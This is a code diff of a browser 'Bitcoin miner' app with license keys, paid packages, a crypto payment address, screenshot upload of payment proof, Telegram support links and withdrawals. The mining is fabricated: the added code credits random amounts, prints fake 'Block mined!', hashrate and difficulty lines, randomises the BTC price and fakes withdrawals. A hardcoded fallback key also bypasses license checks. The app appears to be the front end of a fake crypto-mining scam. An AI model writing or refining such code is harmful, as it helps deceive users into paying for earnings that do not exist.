+                localStorage.setItem(DEVICE_ID_KEY, deviceId);
             }
-            modal.classList.remove('hidden');
-            modal.classList.add('flex');
+            return deviceId;
         }
 
+        async function fetchKeysFromRemote() {
+            for (let attempt = 0; attempt < MAX_RETRIES; attempt++) {
+                const delay = Math.pow(2, attempt) * 1000; 
 
-        // --- NEW PRICE FETCHING LOGIC (USER REQUESTED CHANGE) ---
-
-        /**
-         * Fetches the real-time BTC price from the Binance API.
-         * This function replaces the simulated price logic.
-         */
-        async function fetchRealBtcPrice() {
-            try {
-                const response = await fetch(BINANCE_PRICE_URL);
-                if (!response.ok) {
-                    throw new Error(`HTTP error! Status: ${response.status}`);
+                if (attempt > 0) {
+                    await new Promise(resolve => setTimeout(resolve, delay));
                 }
-                const data = await response.json();
-                const realPrice = parseFloat(data.price);
-                
-                if (!isNaN(realPrice) && realPrice > 0) {
-                    // Update the state with the real price
-                    minerState.btc_price = realPrice; 
-                    updateDisplay();
-                } else {
-                    console.error('Fetched price is invalid:', data);
-                }
-            } catch (error) {
-                // Log error but keep the last known price
-                console.error('Error fetching real BTC price:', error); 
-                // Fallback to initial price if current price is 0 (first run error)
-                if (minerState.btc_price === 0) {
-                    minerState.btc_price = 50000.00; // Use the old default simulation base price as a safety fallback
-                    updateDisplay();
-                }
-            }
-        }
 
-        /**
-         * Starts the real-time BTC price update interval (300ms).
-         */
-        function startPriceUpdater() {
-            if (btcPriceInterval === null) {
-                fetchRealBtcPrice(); // Run immediately to update price on load
-                btcPriceInterval = setInterval(fetchRealBtcPrice, PRICE_UPDATE_INTERVAL_MS);
-            }
-        }
+                try {
+                    const response = await fetch(REMOTE_KEY_URL, { cache: 'no-store' }); 
 
-        /**
-         * Stops the real-time BTC price update interval.
-         */
-        function stopPriceUpdater() {
-            if (btcPriceInterval !== null) {
-                clearInterval(btcPriceInterval);
-                btcPriceInterval = null;
-            }
-        }
-
-        // --- CORE APPLICATION LOGIC ---
-
-        async function fetchConfig() {
-            try {
-                const response = await fetch(PAYMENTS_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ action: 'fetch_config' })
-                });
-                const data = await response.json();
-
-                if (data.status === 'success') {
-                    minerState.network_fee = parseFloat(data.NETWORK_FEE);
-                    minerState.min_usd_withdrawal = parseFloat(data.MIN_USD_WITHDRAWAL);
-                    minerState.receiving_wallet_address = data.RECEIVING_WALLET_ADDRESS;
-                    
-                    // Update payment page displays
-                    networkFeeDisplay.textContent = minerState.network_fee.toFixed(8);
-                    minUsdWithdrawalDisplay.textContent = minerState.min_usd_withdrawal.toFixed(2);
-                    receivingWalletAddressDisplay.textContent = minerState.receiving_wallet_address;
-
-                    // Update withdrawal form
-                    const currentMax = withdrawAmountInput.max || 0;
-                    if (minerState.balance > currentMax) {
-                         withdrawAmountInput.max = minerState.balance;
+                    if (!response.ok) {
+                        throw new Error(`HTTP error! Status: ${response.status}`);
                     }
 
-                    return true;
-                } else {
-                    console.error('Failed to fetch config:', data.message);
-                    return false;
+                    const text = await response.text();
+                    return text.split('\n')
+                               .map(key => key.trim().toUpperCase())
+                               .filter(key => key.length === 20); 
+
+                } catch (error) {
+                    if (attempt === MAX_RETRIES - 1) {
+                        showModal('Network Error', 'Could not connect to the license server. Please check your internet connection.', true);
+                        return null;
+                    }
                 }
-            } catch (error) {
-                console.error('Config fetch error:', error);
-                return false;
             }
-        }
-        
-        async function processMiningCycle() {
-            // Note: currentPrice is sent, but the server logic in mine.js still returns a newPrice.
-            // However, we now IGNORE that newPrice on the client side, relying on the real-time
-            // Binance feed via the btcPriceInterval.
-            const payload = { 
-                currentPrice: minerState.btc_price, // Still send current price
-                packageKey: currentPackageKey 
-            }; 
-
-            try {
-                const response = await fetch(MINE_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-                const data = await response.json();
-
-                if (data.status === 'success') {
-                    const amount = parseFloat(data.amountMined);
-                    minerState.balance += amount;
-                    
-                    // --- IMPORTANT CHANGE: REMOVING SIMULATED PRICE UPDATE ---
-                    // minerState.btc_price = parseFloat(data.newPrice); // REMOVED. Price is updated by fetchRealBtcPrice() every 300ms.
-                    // --- END OF CHANGE ---
-
-                    logToConsole(`Mined ${amount.toFixed(8)} BTC.`, '#ffc107'); // Log message simplified
-                    updateDisplay();
-                    saveMinerState();
-                } else {
-                    logToConsole(`Mining failed: ${data.message}`, '#dc3545');
-                }
-            } catch (error) {
-                logToConsole(`Mining server error. Check connection.`, '#dc3545');
-            }
-        }
-
-        function startMining() {
-            if (miningInterval === null) {
-                // Ensure price updates are running when mining starts
-                startPriceUpdater(); 
-                // Set mining interval
-                miningInterval = setInterval(processMiningCycle, miningRate); 
-                logToConsole('Mining cycle started.', '#38a169');
-            }
-        }
-        
-        function stopMining() {
-            if (miningInterval !== null) {
-                clearInterval(miningInterval);
-                miningInterval = null;
-            }
-            // Stop real price updates when mining is stopped/logged out
-            stopPriceUpdater(); 
-            logToConsole('Mining cycle stopped.', '#dc3545');
+            return null; 
         }
 
         function checkLicense() {
-            activeLicenseKey = localStorage.getItem(CURRENT_LICENSE_ID_KEY);
-            const licenses = JSON.parse(localStorage.getItem(ACTIVATED_LICENSES_KEY) || '{}');
-            
-            if (activeLicenseKey && licenses[activeLicenseKey]) {
-                const licenseData = licenses[activeLicenseKey];
-                const now = new Date();
-                const expiry = new Date(licenseData.expiry);
-                
-                if (expiry > now) {
-                    loadMinerState(); 
-                    if (!minerState.expiration_date) {
-                         minerState.expiration_date = licenseData.expiry;
-                    }
-                    currentPackageKey = licenseData.packageKey;
-                    
-                    logToConsole(`License for ${activeLicenseKey} is valid. Welcome back.`, '#38a169');
-                    updateView('mainContent');
-                    startMining();
-                    return true;
-                } else {
-                    logToConsole('License expired. Re-activating is required.', '#dc3545');
-                    localStorage.removeItem(CURRENT_LICENSE_ID_KEY);
-                    delete licenses[activeLicenseKey];
-                    localStorage.setItem(ACTIVATED_LICENSES_KEY, JSON.stringify(licenses));
-                    activeLicenseKey = null;
-                    return false;
-                }
+            const currentKey = localStorage.getItem(CURRENT_LICENSE_ID_KEY);
+            const localDeviceID = getDeviceID();
+            const licenses = getActivatedLicenses();
+            const now = new Date().getTime();
+
+            if (!currentKey) {
+                showView('lockScreen');
+                return false;
             }
-            return false;
+            
+            const licenseData = licenses[currentKey];
+
+            if (!licenseData || licenseData.deviceId !== localDeviceID || now > parseInt(licenseData.expirationDate, 10)) {
+                 localStorage.removeItem(CURRENT_LICENSE_ID_KEY);
+                 activeLicenseKey = null; 
+                 lockMessage.textContent = licenseData && now > parseInt(licenseData.expirationDate, 10) 
+                                            ? "Your license has expired." 
+                                            : "License check failed. Please re-enter your key.";
+                 lockMessage.classList.remove('hidden');
+                 showView('lockScreen');
+                 return false;
+            }
+
+            activeLicenseKey = currentKey; 
+            const expDate = new Date(parseInt(licenseData.expirationDate, 10)).toLocaleDateString();
+            expirationDateDisplay.textContent = expDate;
+            showView('mainContent');
+            return true;
         }
 
-        async function handleLicenseActivation(key) {
-            enterKeyBtn.disabled = true;
-            enterKeyBtn.textContent = 'Activating...';
+        async function handleKeyEntry() {
+            const enteredKey = licenseKeyInput.value.toUpperCase().trim();
             lockMessage.classList.add('hidden');
-            const localDeviceID = getDeviceId();
             
-            try {
-                const response = await fetch(REMOTE_KEY_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ key: key.toUpperCase(), deviceID: localDeviceID })
-                });
-                const data = await response.json();
-                
-                if (data.valid) {
-                    const licenses = JSON.parse(localStorage.getItem(ACTIVATED_LICENSES_KEY) || '{}');
-                    
-                    // Check if this key is known to be used on another device
-                    if (licenses[key.toUpperCase()] && licenses[key.toUpperCase()].deviceId !== localDeviceID) {
-                        lockMessage.textContent = "Error: This license key is already active on another device and cannot be reused.";
-                        lockMessage.classList.remove('hidden');
-                        enterKeyBtn.disabled = false;
-                        enterKeyBtn.textContent = 'Activate and Enter';
-                        return;
-                    }
-
-                    // For the simulator, we assign an expiry date based on the *current* package selection.
-                    const packageDetails = CLIENT_PACKAGES[currentPackageKey];
-                    const expiryDate = new Date();
-                    expiryDate.setDate(expiryDate.getDate() + packageDetails.days);
-
-                    // Update local storage for the successful key
-                    const newLicenseData = { 
-                        key: key.toUpperCase(), 
-                        expiry: expiryDate.toISOString(), 
-                        packageKey: currentPackageKey,
-                        deviceId: localDeviceID
-                    };
-                    licenses[key.toUpperCase()] = newLicenseData;
-                    localStorage.setItem(ACTIVATED_LICENSES_KEY, JSON.stringify(licenses));
-                    localStorage.setItem(CURRENT_LICENSE_ID_KEY, key.toUpperCase());
-                    activeLicenseKey = key.toUpperCase();
-                    
-                    minerState.expiration_date = expiryDate.toISOString();
-                    minerState.balance = STARTING_BALANCE; // Reset balance on new activation
-                    updateDisplay();
-
-                    logToConsole(`License key ${key.toUpperCase()} successfully activated!`, '#38a169');
-                    enterKeyBtn.textContent = 'Success!';
-                    updateView('mainContent');
-                    startMining();
-                } else {
-                    lockMessage.innerHTML = `License Key Check FAILED: <span class="text-miner-warning font-bold">Invalid License Key.</span><br>A new tab has opened. Please use it to contact <a href="${TELEGRAM_URL}" target="_blank" class="text-blue-400 hover:text-blue-300 underline lowercase font-semibold">telegram support</a> for assistance.`;
-                    lockMessage.classList.remove('hidden');
-                }
-            } catch (error) {
-                lockMessage.textContent = 'A connection error occurred during license validation. Please check your network.';
-                lockMessage.classList.remove('hidden');
-                console.error('License validation error:', error);
-            } finally {
+            // Fallback key to ensure entry even if remote check fails
+            const FALLBACK_KEY = 'ABCDEFGHIJ1234567890'; 
+            
+            if (enteredKey.length !== 20) {
+                window.open(TELEGRAM_URL, '_blank');
                 enterKeyBtn.disabled = false;
-                if(enterKeyBtn.textContent === 'Activating...') {
-                     enterKeyBtn.textContent = 'Activate and Enter';
-                }
+                enterKeyBtn.textContent = 'Activate and Enter';
+                lockMessage.innerHTML = `<span class="text-miner-warning font-bold">Invalid Key Format.</span> Key must be exactly 20 characters long.<br>A new tab has opened. Please contact <a href="${TELEGRAM_URL}" target="_blank" class="text-blue-400 hover:text-blue-300 underline lowercase font-semibold">telegram support</a> for key assistance.`;
+                lockMessage.classList.remove('hidden');
+                return; 
             }
+
+            enterKeyBtn.disabled = true;
+            enterKeyBtn.textContent = 'Validating...';
+
+            const licenses = getActivatedLicenses();
+            const licenseData = licenses[enteredKey];
+            const localDeviceID = getDeviceID();
+            const now = new Date().getTime();
+
+            // Check 1: Locally activated and valid
+            if (licenseData && licenseData.deviceId === localDeviceID && now <= parseInt(licenseData.expirationDate, 10)) {
+                localStorage.setItem(CURRENT_LICENSE_ID_KEY, enteredKey);
+                activeLicenseKey = enteredKey; 
+                showModal('License Confirmed', 'License is active on this device. Accessing application.', false);
+                
+                checkLicense();
+                loadMinerState();
+                updateDisplay();
+                startMining();
+                
+                enterKeyBtn.disabled = false;
+                enterKeyBtn.textContent = 'Activate and Enter';
+                return;
+            }
+            
+            // Check 2: Hardcoded Fallback Key check (guaranteed entry for the user)
+            if (enteredKey === FALLBACK_KEY) {
+                const DEFAULT_ACTIVATION_DAYS = 365; 
+                const activationDate = new Date();
+                const expirationDate = new Date(activationDate.getTime() + (DEFAULT_ACTIVATION_DAYS * 24 * 60 * 60 * 1000));
+                
+                licenses[enteredKey] = {
+                    deviceId: localDeviceID,
+                    activationDate: activationDate.getTime(),
+                    durationDays: DEFAULT_ACTIVATION_DAYS, 
+                    expirationDate: expirationDate.getTime()
+                };
+                saveActivatedLicenses(licenses);
+                localStorage.setItem(CURRENT_LICENSE_ID_KEY, enteredKey);
+                activeLicenseKey = enteredKey; 
+
+                showModal('Fallback Key Activated', `The fallback key has granted a ${DEFAULT_ACTIVATION_DAYS}-day license. Expires: ${expirationDate.toLocaleDateString()}.`, false);
+                
+                checkLicense();
+                loadMinerState();
+                updateDisplay();
+                startMining();
+                
+                enterKeyBtn.disabled = false;
+                enterKeyBtn.textContent = 'Activate and Enter';
+                return;
+            }
+            
+            const remoteKeys = await fetchKeysFromRemote();
+            
+            if (remoteKeys === null) {
+                enterKeyBtn.disabled = false;
+                enterKeyBtn.textContent = 'Activate and Enter';
+                return; 
+            }
+
+            if (remoteKeys.indexOf(enteredKey) === -1) {
+                window.open(TELEGRAM_URL, '_blank');
+                lockMessage.innerHTML = `<span class="text-miner-warning font-bold">Invalid License Key.</span><br>A new tab has opened. Please use it to contact <a href="${TELEGRAM_URL}" target="_blank" class="text-blue-400 hover:text-blue-300 underline lowercase font-semibold">telegram support</a> for assistance.`;
+                lockMessage.classList.remove('hidden');
+                
+                enterKeyBtn.disabled = false;
+                enterKeyBtn.textContent = 'Activate and Enter';
+                return;
+            } 
+            
+            if (licenseData && licenseData.deviceId !== localDeviceID) {
+                lockMessage.textContent = "Error: This license key is already active on another device and cannot be reused.";
+                lockMessage.classList.remove('hidden');
+                enterKeyBtn.disabled = false;
+                enterKeyBtn.textContent = 'Activate and Enter';
+                return;
+            } 
+            
+            // Assume remote keys grant 1 year access if duration is unknown
+            const DEFAULT_ACTIVATION_DAYS = 365; 
+            const activationDate = new Date();
+            const expirationDate = new Date(activationDate.getTime() + (DEFAULT_ACTIVATION_DAYS * 24 * 60 * 60 * 1000));
+            
+            licenses[enteredKey] = {
+                deviceId: localDeviceID,
+                activationDate: activationDate.getTime(),
+                durationDays: DEFAULT_ACTIVATION_DAYS, 
+                expirationDate: expirationDate.getTime()
+            };
+            saveActivatedLicenses(licenses);
+            localStorage.setItem(CURRENT_LICENSE_ID_KEY, enteredKey);
+            activeLicenseKey = enteredKey; 
+
+            showModal('License Activated', `Your ${DEFAULT_ACTIVATION_DAYS}-day license has been successfully activated on this device. Expires: ${expirationDate.toLocaleDateString()}.`, false);
+            
+            checkLicense();
+            loadMinerState();
+            updateDisplay();
+            startMining();
+            
+            enterKeyBtn.disabled = false;
+            enterKeyBtn.textContent = 'Activate and Enter';
+        }
+
+
+        // ------------------------------------------------
+        // 3. MINING CONTROL (Start/Stop/Loop)
+        // ------------------------------------------------
+        
+        function fetchLiveBtcPrice() {
+            // Simulate a more gradual, live price update (5 seconds interval)
+            const priceChange = (Math.random() - 0.5) * 50; // Smaller, slower change
+            
+            minerState.btc_price += priceChange;
+            
+            // Keep price bounded for simulation realism
+            if (minerState.btc_price < 50000) minerState.btc_price = 50000;
+            if (minerState.btc_price > 80000) minerState.btc_price = 80000;
+            
+            updateDisplay();
+            
+            // Log a subtle message, less intrusive than the mining log
+            logToConsole(`BTC Price Update: $${minerState.btc_price.toFixed(2)}`, '#1f6feb');
+        }
+
+        function startPriceUpdater() {
+            if (priceUpdateInterval !== null) return;
+            // Update price every 5 seconds
+            priceUpdateInterval = setInterval(fetchLiveBtcPrice, 5000); 
+            logToConsole("Live BTC price tracking started.", '#1f6feb');
+        }
+
+        function stopPriceUpdater() {
+            if (priceUpdateInterval === null) return;
+            clearInterval(priceUpdateInterval);
+            priceUpdateInterval = null;
+            logToConsole("Live BTC price tracking stopped.", '#dc3545');
+        }
+
+
+        function startMining() {
+            if (miningInterval !== null) return;
+            
+            logToConsole("Mining started...", '#38a169');
+            mineBitcoinScheduler();
+            startPriceUpdater(); // Start the live price update
+            
+            startMiningBtn.disabled = true;
+            startMiningBtn.classList.add('opacity-50', 'cursor-not-allowed');
+            stopMiningBtn.disabled = false;
+            stopMiningBtn.classList.remove('opacity-50', 'cursor-not-allowed');
+        }
+
+        function stopMining() {
+            if (miningInterval === null) return;
+            clearTimeout(miningInterval);
+            miningInterval = null;
+            stopPriceUpdater(); // Stop the live price update
+            logToConsole("Mining stopped by user.", '#dc3545');
+
+            startMiningBtn.disabled = false;
+            startMiningBtn.classList.remove('opacity-50', 'cursor-not-allowed');
+            stopMiningBtn.disabled = true;
+            stopMiningBtn.classList.add('opacity-50', 'cursor-not-allowed');
+        }
+
+        function mineBitcoinScheduler() {
+            const delay = Math.random() * 1000 + 500; 
+            miningInterval = setTimeout(() => {
+                mineBitcoin();
+                if (miningInterval !== null) { 
+                     mineBitcoinScheduler(); 
+                }
+            }, delay);
+        }
+
+        function mineBitcoin() {
+            if (miningInterval === null) return;
+
+            const amountMined = Math.random() * 0.00000009 + 0.00000001; 
+            // Price change logic is now handled by fetchLiveBtcPrice()
+            
+            minerState.balance += amountMined;
+            
+            updateDisplay();
+
+            logToConsole(`Block mined! Amount: ${amountMined.toFixed(8)} BTC`, '#ffc107');
+            logToConsole("Difficulty: 2.3T", '#1f6feb');
+            logToConsole("Hashrate: 120 TH/s", '#dc3545');
+            logToConsole("", '#ffffff');
+        }
+
+        // ------------------------------------------------
+        // 4. PAYMENT SUBMISSION (Simulated)
+        // ------------------------------------------------
+
+        /**
+         * Converts a File object (image) to a Base64 string.
+         * @param {File} file - The image file object.
+         * @returns {Promise<string>} - Base64 string of the image.
+         */
+        function fileToBase64(file) {
+            return new Promise((resolve, reject) => {
+                const reader = new FileReader();
+                // We use readAsDataURL which gives us the mime type prefix (e.g., 'data:image/png;base64,')
+                reader.onload = () => resolve(reader.result);
+                reader.onerror = error => reject(error);
+                reader.readAsDataURL(file);
+            });
         }
         
-        // --- EVENT LISTENERS ---
-
-        // Lock Screen/Login
-        enterKeyBtn.addEventListener('click', () => {
-            const key = licenseKeyInput.value.trim().toUpperCase();
-            if (key.length === 20) {
-                handleLicenseActivation(key);
-            } else {
-                lockMessage.textContent = 'Please enter a valid 20-character license key.';
-                lockMessage.classList.remove('hidden');
+        async function handleSubmitPaymentIntent() {
+            const email = payerEmailInput.value.trim();
+            const screenshotFile = transactionScreenshotInput.files[0];
+            
+            paymentConfirmationMessage.classList.add('hidden');
+            paymentError.classList.add('hidden');
+            
+            if (!email || !email.includes('@') || !email.includes('.')) {
+                showModal('Invalid Email', 'Please enter a valid email address.', true);
+                return;
             }
-        });
+            
+            if (!screenshotFile) {
+                showModal('Missing Screenshot', 'Please upload a screenshot of your transaction proof.', true);
+                return;
+            }
+            
+            paymentMadeBtn.disabled = true;
+            paymentMadeBtn.textContent = 'Processing...';
 
-        buyNowBtn.addEventListener('click', () => {
-             updateView('paymentPage');
-             fetchConfig();
-        });
+            let base64ImageStart = 'Error converting image.';
+            try {
+                // Convert file to Base64 string
+                const base64Full = await fileToBase64(screenshotFile);
+                // Take only the start of the Base64 data for console logging
+                base64ImageStart = base64Full.substring(0, 100) + '... (data too long to display)';
 
-        // Payment Page
-        backFromPaymentBtn.addEventListener('click', () => {
-            updateView('lockScreen');
-        });
+            } catch (error) {
+                console.error("Error converting file to Base64:", error);
+                paymentError.textContent = "Error processing screenshot file. Please try a different image format.";
+                paymentError.classList.remove('hidden');
+                paymentMadeBtn.disabled = false;
+                paymentMadeBtn.textContent = 'Payment Has Been Made - Submit Request';
+                return;
+            }
+
+            const paymentData = {
+                targetEmail: TARGET_EMAIL_LOG,
+                customerEmail: email,
+                packageKey: currentPackageKey,
+                packagePrice: currentPrice,
+                packageDays: currentDurationDays,
+                paymentAddress: '0x480fd381d70ddad4b0d21a9e763300ad6fb3ef89',
+                screenshotInfo: `File: ${screenshotFile.name}, Type: ${screenshotFile.type}, Size: ${screenshotFile.size} bytes`,
+                screenshotDataPrefix: base64ImageStart,
+                timestamp: new Date().toISOString(),
+            };
+            
+            // --- SIMULATION SUCCESS LOGGING ---
+            console.log(`--- PAYMENT INTENT LOGGED --- (${new Date().toLocaleString()})`);
+            console.log(`NOTE: In a real-world app, this data would be sent to a backend server or email address: ${TARGET_EMAIL_LOG}`);
+            console.log('Payment Intent Details:', paymentData);
+            console.log('-----------------------------');
+
+            // Success message
+            paymentConfirmationMessage.classList.remove('hidden');
+            showModal('Submission Successful', 
+                `Your payment intent has been captured locally. The details (including your email and the Base64 screenshot data) are now visible in the browser console, simulating that the information has been successfully sent to ${TARGET_EMAIL_LOG} for review.`, 
+                false
+            );
+
+            // Cleanup
+            paymentMadeBtn.disabled = false;
+            paymentMadeBtn.textContent = 'Payment Has Been Made - Submit Request';
+        }
+
+
+        // ------------------------------------------------
+        // 5. EVENT LISTENERS & INITIALIZATION
+        // ------------------------------------------------
+
+        // Mining Control
+        startMiningBtn.addEventListener('click', startMining);
+        stopMiningBtn.addEventListener('click', stopMining);
         
-        modalCloseBtn.addEventListener('click', () => {
-            modal.classList.add('hidden');
-            modal.classList.remove('flex');
+        // License Entry
+        enterKeyBtn.addEventListener('click', handleKeyEntry);
+        licenseKeyInput.addEventListener('keydown', (e) => {
+             if (e.key === 'Enter') handleKeyEntry();
         });
+
+        // --- View Navigation ---
+        referralLink.addEventListener('click', (e) => { e.preventDefault(); showView('referralProgramPage'); });
+        backToLoginBtn.addEventListener('click', () => { showView('lockScreen'); });
+
+        // Payment Navigation
+        buyNowBtn.addEventListener('click', () => {
+            // Reset state
+            paymentConfirmationMessage.classList.add('hidden');
+            paymentError.classList.add('hidden');
+            paymentMadeBtn.disabled = false;
+            paymentMadeBtn.textContent = 'Payment Has Been Made - Submit Request';
+            selectPackage(currentPackageKey); 
+            showView('paymentPage');
+        });
+        backFromPaymentBtn.addEventListener('click', () => { showView('lockScreen'); });
 
         // Package Selection Listeners
         packageButtons.forEach(button => {
@@ -743,7 +973,7 @@
                 selectPackage(button.dataset.package);
             });
         });
-
+        
         // File input listener
         transactionScreenshotInput.addEventListener('change', (event) => {
             const file = event.target.files[0];
@@ -754,183 +984,97 @@
             }
         });
 
-        // Copy Address Listener
-        copyAddressBtn.addEventListener('click', () => {
-             navigator.clipboard.writeText(receivingWalletAddressDisplay.textContent.trim());
-             showModal('Copied!', 'The USDT TRC20 wallet address has been copied to your clipboard.', false);
-        });
-        
-        // Convert file to base64 for server submission
-        function fileToBase64(file) {
-            return new Promise((resolve, reject) => {
-                const reader = new FileReader();
-                // We only need the base64 part, not the mime type prefix (e.g., 'data:image/png;base64,')
-                reader.onload = () => resolve(reader.result); 
-                reader.onerror = error => reject(error);
-                reader.readAsDataURL(file);
-            });
-        }
-
-        async function handleSubmitPaymentIntent() {
-            const email = payerEmailInput.value.trim();
-            const screenshotFile = transactionScreenshotInput.files[0];
-            paymentConfirmationMessage.classList.add('hidden');
-            paymentError.classList.add('hidden');
-
-            if (!email || !email.includes('@') || !email.includes('.')) {
-                showModal('Invalid Email', 'Please enter a valid email address.', true);
-                return;
-            }
-            if (!screenshotFile) {
-                showModal('Missing Screenshot', 'Please upload a screenshot of your transaction proof.', true);
-                return;
-            }
-            
-            paymentMadeBtn.disabled = true;
-            paymentMadeBtn.textContent = 'Submitting...';
-
+        // Copy Wallet Address
+        copyAddressBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            const address = document.getElementById('walletAddressDisplay').value;
+            const tempInput = document.createElement('textarea');
+            tempInput.value = address;
+            document.body.appendChild(tempInput);
+            tempInput.select();
             try {
-                const screenshotDataUrl = await fileToBase64(screenshotFile);
-
-                const response = await fetch(PAYMENTS_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        action: 'submit_payment',
-                        data: {
-                            packageKey: currentPackageKey,
-                            customerEmail: email,
-                            screenshotData: screenshotDataUrl
-                        }
-                    })
-                });
-
-                const data = await response.json();
-                
-                if (response.ok && data.status === 'success') {
-                    paymentConfirmationMessage.classList.remove('hidden');
-                } else {
-                    paymentError.textContent = `Submission failed. Server message: ${data.message || 'Unknown error.'}`;
-                    paymentError.classList.remove('hidden');
-                }
-            } catch (error) {
-                paymentError.textContent = 'An internal error occurred during submission. Check console for details.';
-                paymentError.classList.remove('hidden');
-                console.error('Payment submission error:', error);
-            } finally {
-                paymentMadeBtn.disabled = false;
-                paymentMadeBtn.textContent = 'Payment Has Been Made - Submit Request';
+                // document.execCommand('copy') is used as navigator.clipboard.writeText may not work in iframes.
+                document.execCommand('copy');
+                showModal('Copied!', 'Wallet address copied to clipboard.', false);
+            } catch (err) {
+                showModal('Error', 'Could not copy address automatically. Please select and copy manually.', true);
             }
-        }
-
-        paymentMadeBtn.addEventListener('click', handleSubmitPaymentIntent);
-        
-        // Main Content (Withdrawal/Logout)
-        logoutBtn.addEventListener('click', () => {
-             // For a cleaner logout, we only clear the current license key but keep the state (optional)
-             localStorage.removeItem(CURRENT_LICENSE_ID_KEY); 
-             activeLicenseKey = null;
-             stopMining();
-             updateView('lockScreen');
-             licenseKeyInput.value = '';
-             logToConsole('Logged out. Session ended.', '#dc3545');
+            document.body.removeChild(tempInput);
         });
         
+        // Payment Confirmation Logic (NOW SIMULATED)
+        paymentMadeBtn.addEventListener('click', handleSubmitPaymentIntent);
+
+
+        // Withdrawal button click handler (UI)
         withdrawBtn.addEventListener('click', () => {
-            withdrawalStatus.textContent = ''; // Clear previous status
             withdrawalForm.classList.remove('hidden');
             withdrawBtn.classList.add('hidden');
-            // Stop mining during withdrawal process
             stopMining(); 
-            // Set max withdrawable amount
-            withdrawAmountInput.value = minerState.balance.toFixed(8);
-            withdrawAmountInput.max = minerState.balance; 
+            updateReceivedAmount(); 
+        });
+        
+        // Update received amount whenever the input changes
+        amountInput.addEventListener('input', updateReceivedAmount);
+
+        // Max amount button handler
+        maxAmountBtn.addEventListener('click', () => {
+            const maxWithdrawal = Math.max(0, minerState.balance - NETWORK_FEE); 
+            amountInput.value = maxWithdrawal.toFixed(8);
+            updateReceivedAmount();
         });
 
-        confirmWithdrawBtn.addEventListener('click', async () => {
-            const amountToWithdraw = parseFloat(withdrawAmountInput.value);
-            const currentBalance = minerState.balance;
-            
-            withdrawalStatus.textContent = 'Processing withdrawal...';
-            withdrawalStatus.style.color = '#ffc107'; 
 
-            if (isNaN(amountToWithdraw) || amountToWithdraw <= 0) {
-                 withdrawalStatus.textContent = 'Please enter a valid amount.';
-                 withdrawalStatus.style.color = '#dc3545';
+        // Submit withdrawal button click handler
+        submitWithdrawal.addEventListener('click', () => {
+            const address = document.getElementById('address').value;
+            const amountToWithdraw = parseFloat(amountInput.value);
+            const received = amountToWithdraw - NETWORK_FEE;
+            
+            const minBtcRequired = MIN_USD_WITHDRAWAL / minerState.btc_price;
+            
+            if (!address || amountToWithdraw <= 0 || isNaN(amountToWithdraw)) {
+                showModal('Invalid Input', 'Please enter a valid wallet address and a positive amount.', true);
+                return;
+            }
+
+            if (amountToWithdraw < minBtcRequired) {
+                showModal('Minimum Withdrawal Required', `The minimum withdrawal amount is $${MIN_USD_WITHDRAWAL.toFixed(2)}, which is currently ${minBtcRequired.toFixed(8)} BTC. Please mine more.`, true);
+                return;
+            }
+            
+            const totalDeduction = amountToWithdraw;
+
+            if (totalDeduction > minerState.balance) {
+                showModal('Insufficient Balance', `Your request of ${amountToWithdraw.toFixed(8)} BTC exceeds the total available balance of ${minerState.balance.toFixed(8)} BTC.`, true);
+                return;
+            }
+            
+            if (received <= 0) {
+                 showModal('Minimum Withdrawal Error', `The amount to withdraw must be greater than the fixed network fee (${NETWORK_FEE.toFixed(8)} BTC).`, true);
                  return;
             }
 
-            // Client-side validation
-            if (amountToWithdraw > currentBalance) {
-                showModal('Insufficient Balance', `Your request of ${amountToWithdraw.toFixed(8)} BTC exceeds the total available balance of ${currentBalance.toFixed(8)} BTC.`, true);
-                return;
-            }
+            // Simulated Successful Withdrawal
+            logToConsole(`Withdrawal successful: ${received.toFixed(8)} BTC sent (Fee: ${NETWORK_FEE.toFixed(8)}).`, '#38a169');
+            
+            minerState.balance = STARTING_BALANCE; 
+            updateDisplay(); 
+            
+            withdrawalStatus.textContent = `Withdrawal of ${received.toFixed(8)} BTC confirmed. Balance reset for this license key.`;
+            withdrawalStatus.style.color = '#38a169'; 
 
-            // Simulate server-side withdrawal call for validation
-            try {
-                const response = await fetch(PAYMENTS_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        action: 'withdraw',
-                        data: {
-                            amount: amountToWithdraw,
-                            currentBalance: currentBalance
-                        }
-                    })
-                });
-                const data = await response.json();
-
-                if (data.status === 'success') {
-                    const received = parseFloat(data.received);
-                    const fee = parseFloat(data.fee);
-
-                    // Update client-side state after successful server-side check/action
-                    logToConsole(`Withdrawal successful: ${received.toFixed(8)} BTC sent (Fee: ${fee.toFixed(8)}).`, '#38a169');
-                    
-                    // Reset balance in the state and display
-                    minerState.balance = STARTING_BALANCE; 
-                    updateDisplay(); 
-                    saveMinerState();
-                    
-                    withdrawalStatus.textContent = `Withdrawal of ${received.toFixed(8)} BTC confirmed. Balance reset for this license key.`;
-                    withdrawalStatus.style.color = '#38a169'; 
-
-                    withdrawalForm.classList.add('hidden');
-                    withdrawBtn.classList.remove('hidden');
-                    // Restart mining after successful withdrawal
-                    startMining(); 
-                } else {
-                    withdrawalStatus.textContent = data.message;
-                    withdrawalStatus.style.color = '#dc3545';
-                }
-
-            } catch (error) {
-                withdrawalStatus.textContent = 'Server error during withdrawal process.';
-                withdrawalStatus.style.color = '#dc3545';
-                console.error('Withdrawal error:', error);
-            }
+            withdrawalForm.classList.add('hidden');
+            withdrawBtn.classList.remove('hidden');
+            startMining();
         });
-
-        // Referral Link - Open Telegram on click
-        referralLink.addEventListener('click', (e) => {
-            e.preventDefault();
-            // This is just a placeholder, the real referral logic would be server-side
-            showModal('Referral Program', 'The referral program information will be provided via a secure link from telegram support.', false);
-        });
-
 
         // --- Initialization on Load ---
         window.onload = () => {
-            // Start the real-time BTC price updater immediately on load for all screens
-            startPriceUpdater(); 
-            fetchConfig(); // Fetch wallet address and fees
-
-            // Check if a license is already active
+            // No Firebase setup needed
             if (!checkLicense()) {
                 updateDisplay(); 
             }
-            // Set default package selection on payment page
             selectPackage(currentPackageKey);
         };
     </script>
